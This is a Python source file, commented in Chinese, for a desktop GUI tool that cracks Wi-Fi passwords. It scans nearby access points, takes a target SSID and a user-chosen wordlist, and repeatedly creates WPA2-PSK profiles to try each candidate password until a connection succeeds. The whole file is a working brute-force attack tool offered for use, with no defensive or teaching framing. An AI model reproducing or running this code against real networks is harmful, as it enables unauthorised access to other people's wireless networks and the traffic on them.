# import os
# import sys
# import copy
import threading
import pywifi
from pywifi import const
import time
from PySide2.QtWidgets import *
from PySide2.QtUiTools import QUiLoader
from PySide2.QtCore import QFile, QStringListModel


class Wifi:
    wifi = pywifi.PyWiFi()
    try:
        iface = wifi.interfaces()[0]  # 返回的是一个列表，取第一个wifi网卡
    except Exception as e:
        print("获取网卡列表失败:", e)

    # 获取当前无线网卡信息
    def get_nic(self):
        return self.iface.name()

    # 扫描的wifi列表信息
    def scan_wifi_list(self):
        self.iface.disconnect()  # 断开当前wifi连接
        assert self.iface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]  # 检查网卡是否处于断开状态
        self.iface.scan()  # 扫描附近AP
        time.sleep(2)  # 等待扫描完成
        results = self.iface.scan_results()  # 获取扫描结果
        ap_set = set()  # 创建一个set集合，用来存放扫描结果，用来对扫描结果进行去重复处理
        for x in results:
            # ap_name = x.ssid
            ap_set.add(x.ssid)
        global ap_list
        ap_list = list(ap_set)
        model_list = QStringListModel()
        model_list.setStringList(ap_list)
        return model_list

    # 开始破解
    def Crack(self, status_list):
        status_list.clear()
        global ssid_name
        # 读取字典
        try:
            global path
            if path[0] != " ":
                print("字典已选择" + path[0])
        except Exception as e:
            print("未选择字典")
            return
        file = open(path[0], "r")
        N = 1  # 循环计数用
        profiles = self.iface.network_profiles()
        # 遍历所有配置文件
        for profile in profiles:
            if profile.ssid == ssid_name:
                print(f"发现旧的 '{ssid_name}' 配置，正在移除以确保使用新密码...")
                self.iface.remove_network_profile(profile)
                break  # 找到并删除后即可退出循环
        while True:
            self.iface.disconnect()  # 断开当前wifi连接
            if 'tmp_profile' in locals():
                self.iface.remove_network_profile(tmp_profile)
            # 设置配置文件
            profile = pywifi.Profile()
            profile.ssid = ssid_name
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            password = file.readline().strip()  # 因为\n的存在所以这里if判断直接写了>=9
            if len(password) >= 8:
                profile.key = password
                tmp_profile = self.iface.add_network_profile(profile)
                self.iface.connect(tmp_profile)
                time.sleep(5)
                if self.iface.status() == const.IFACE_CONNECTED:
                    status_list.addItem(f"{N}. 破解成功.密码：{password.rstrip()}")
                    status_list.scrollToBottom()
                    file.close()
                    return
                # print("尝试密码:" + password.rstrip('\n'))
                status_list.addItem(f"{N}. 尝试密码：{password.rstrip()}")
                status_list.scrollToBottom()
                N += 1
            elif len(password) == 0:
                status_list.addItem(f"{N}. 未找到密码")
                status_list.scrollToBottom()
                return
            else:
                continue


class Stats:
    def __init__(self):
        self.wifi = Wifi()

        # 从文件加载UI界面
        qfile_stats = QFile("ui_Main.ui")
        qfile_stats.open(QFile.ReadOnly)
        qfile_stats.close()
        self.ui = QUiLoader().load(qfile_stats)

        # UI界面设置网卡信息
        self.ui.comboBox.addItem(self.wifi.get_nic())
        # self.ui.auth.setText("const.AUTH_ALG_WPA2PSK")
        # self.ui.safe.setText("const.AKM_TYPE_WPA2PSK")
        # self.ui.pass_type.setText("const.CIPHER_TYPE_CCMP")

        self.ui.scan_wifi.clicked.connect(self.scan)    # 扫描wifi按钮绑定事件
        self.ui.select_dict.clicked.connect(self.path)   # 选择字典按钮事件
        self.ui.wifi_list.clicked.connect(self.select_wifi_list)    # list被选中
        self.ui.Start_Crack.clicked.connect(self.Crack)  # 破解按钮绑定事件

    def scan(self):
        APs = self.wifi.scan_wifi_list()   # UI界面设置获取的扫描结果
        self.ui.wifi_list.setModel(APs)

    def path(self):
        global path
        path = QFileDialog.getOpenFileName()
        self.ui.textBrowser.setText(path[0])

    def select_wifi_list(self, item):
        global ap_list
        global ssid_name
        ssid_name = ap_list[item.row()]
        self.ui.ssid.setText(ssid_name)

    def Crack(self):
        # 防止界面卡死，开启多线程运行，后台破解
        t1 = threading.Thread(target=self.wifi.Crack, args=(self.ui.status_list,))
        t1.start()


if __name__ == '__main__':
    app = QApplication([])
    stats1 = Stats()
    stats1.ui.show()
    app.exec_()
